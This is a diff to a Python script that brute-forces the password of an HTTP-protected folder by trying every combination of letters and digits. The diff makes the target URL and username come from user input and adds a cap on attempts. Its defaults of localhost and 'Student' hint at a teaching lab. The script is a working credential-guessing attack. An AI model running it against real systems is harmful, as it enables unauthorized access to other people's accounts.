@@ -2,9 +2,10 @@ import requests
 from itertools import product
 import string
 
-# Define target URL and credentials
-url = "http://localhost/protected/"
-username = "Student"
+# Get inputs from the user
+url = input("Enter the URL of the protected folder (e.g., http://localhost/protected/): ").strip()
+username = input("Enter the username: ").strip()
+max_attempts = int(input("Enter the maximum number of attempts: ").strip())
 
 # Define possible characters and password length range
 characters = string.ascii_letters + string.digits
@@ -29,6 +30,10 @@ def try_password(password):
 # Generate password combinations and test them
 for length in range(min_length, max_length + 1):
     for password_tuple in product(characters, repeat=length):
+        if attempts >= max_attempts:
+            print("[FAILURE] Maximum number of attempts reached.")
+            success = False
+            break
         password = ''.join(password_tuple)
         if try_password(password):
             success = True
@@ -37,4 +42,4 @@ for length in range(min_length, max_length + 1):
         break
 
 if not success:
-    print("[FAILURE] Password not found in the given range.")
+    print("[FAILURE] Password not found in the given range or within the attempt limit.")
